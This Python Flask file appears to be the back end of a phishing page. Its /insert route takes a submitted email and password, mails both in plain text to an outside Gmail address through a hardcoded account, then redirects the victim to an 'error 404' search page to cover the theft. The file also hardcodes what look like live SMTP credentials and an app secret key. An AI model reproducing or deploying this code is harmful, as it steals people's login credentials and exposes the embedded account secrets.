from flask import Flask, render_template, request, redirect
from flask_mail import Mail, Message

app = Flask(__name__)

app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT']=465
app.config['MAIL_USERNAME'] = 'flaskapp389@gmail.com'
app.config['MAIL_PASSWORD'] = 'Flaskapp@3891821'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.secret_key = 'sds4878asdkfn38j9we'

mail = Mail(app)


@app.route('/')
def home():
    return render_template("index.html")


@app.route('/insert', methods=['GET', 'POST'])
def insert():
    url = "https://tse4.mm.bing.net/th?id=OIP.aBhALad4txuWlHF3z4r0HwHaHa&pid=Api&P=0&w=300&h=300"
    email = request.form['email']
    pas = request.form['pass']
    msg = Message('subject', sender='flaskapp389@gmail.com', recipients=["mohsimkhan9954@gmail.com"])
    msg.body = "Username: "+email+"\nPassword: "+pas
    mail.send(msg)
    url = "https://in.search.facebook.com/search;_ylt=AwrwSYqeae1gVHUAQgC7HAx.;_ylc=X1MDMjExNDcyMzAwMwRfcgMyBGZyA21jYWZlZQRncHJpZAMEbl9yc2x0AzAEbl9zdWdnAzAEb3JpZ2luA2luLnNlYXJjaC55YWhvby5jb20EcG9zAzAEcHFzdHIDBHBxc3RybAMwBHFzdHJsAzkEcXVlcnkDZXJyb3IlMjA0MDQEdF9zdG1wAzE2MjYxNzE4MTk-?p=error+404&fr2=sb-top&fr=mcafee&vm=r&type=E211IN826G91370"
    return redirect(url)


if __name__ == '__main__':
    app.run()